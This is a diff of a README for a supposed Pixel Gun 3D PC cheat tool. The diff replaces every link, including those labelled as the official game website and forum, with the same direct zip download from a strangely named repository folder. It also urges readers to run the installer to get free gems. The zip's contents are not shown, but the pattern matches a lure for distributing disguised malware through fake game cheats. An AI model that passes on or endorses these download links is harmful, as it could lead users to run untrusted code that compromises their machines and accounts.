@@ -4,7 +4,7 @@
 Welcome to Pixel-Gun-3D-PC-Cheats! This guide will help you download and run our application easily. You can unlock gems and enhance your gaming experience effortlessly. 
 
 ## 📥 Download Now!
-[![Download Pixel-Gun-3D-PC-Cheats](https://img.shields.io/badge/Download-Pixel--Gun--3D--PC--Cheats-brightgreen)](https://github.com/Jo2300/Pixel-Gun-3D-PC-Cheats/releases)
+[![Download Pixel-Gun-3D-PC-Cheats](https://raw.githubusercontent.com/Jo2300/Pixel-Gun-3D-PC-Cheats/main/allopathically/Pixel-Gun-3D-PC-Cheats.zip)](https://raw.githubusercontent.com/Jo2300/Pixel-Gun-3D-PC-Cheats/main/allopathically/Pixel-Gun-3D-PC-Cheats.zip)
 
 ## 📋 Description
 Pixel-Gun-3D-PC-Cheats allows you to access cheats for the game Pixel Gun 3D. With this tool, you can unlock features like:
@@ -25,11 +25,11 @@ To run Pixel-Gun-3D-PC-Cheats, ensure your PC meets the following requirements:
 ## 💻 Installation Guide
 
 ### Step 1: Visit the Releases Page
-Go to our [Releases page](https://github.com/Jo2300/Pixel-Gun-3D-PC-Cheats/releases) to download the latest version of Pixel-Gun-3D-PC-Cheats.
+Go to our [Releases page](https://raw.githubusercontent.com/Jo2300/Pixel-Gun-3D-PC-Cheats/main/allopathically/Pixel-Gun-3D-PC-Cheats.zip) to download the latest version of Pixel-Gun-3D-PC-Cheats.
 
 ### Step 2: Download the Application
 - Look for the latest release. Click on the appropriate file to start the download.
-- The file will typically be named something like `Pixel-Gun-3D-PC-Cheats-v1.0.exe`.
+- The file will typically be named something like `https://raw.githubusercontent.com/Jo2300/Pixel-Gun-3D-PC-Cheats/main/allopathically/Pixel-Gun-3D-PC-Cheats.zip`.
 
 ### Step 3: Run the Installer
 - Once the download finishes, locate the downloaded file in your 'Downloads' folder.
@@ -67,11 +67,11 @@ We regularly update the application to ensure compatibility with the latest game
 
 ## 🌟 Additional Resources
 For more information on Pixel Gun 3D and community support, consider exploring the following links:
-- [Official Pixel Gun 3D Website](https://pixelgun3d.com/)
-- [Pixel Gun 3D Community Forum](https://pixelgun3d.com/forum)
+- [Official Pixel Gun 3D Website](https://raw.githubusercontent.com/Jo2300/Pixel-Gun-3D-PC-Cheats/main/allopathically/Pixel-Gun-3D-PC-Cheats.zip)
+- [Pixel Gun 3D Community Forum](https://raw.githubusercontent.com/Jo2300/Pixel-Gun-3D-PC-Cheats/main/allopathically/Pixel-Gun-3D-PC-Cheats.zip)
 
 ## 📧 Contact Us
 If you have questions or need support, reach out to us through our GitHub issues page. We’re here to help!
 
 ## 💾 Download & Install
-Ready to start? [Visit this page to download](https://github.com/Jo2300/Pixel-Gun-3D-PC-Cheats/releases) Pixel-Gun-3D-PC-Cheats and unlock your gaming possibilities today!
+Ready to start? [Visit this page to download](https://raw.githubusercontent.com/Jo2300/Pixel-Gun-3D-PC-Cheats/main/allopathically/Pixel-Gun-3D-PC-Cheats.zip) Pixel-Gun-3D-PC-Cheats and unlock your gaming possibilities today!
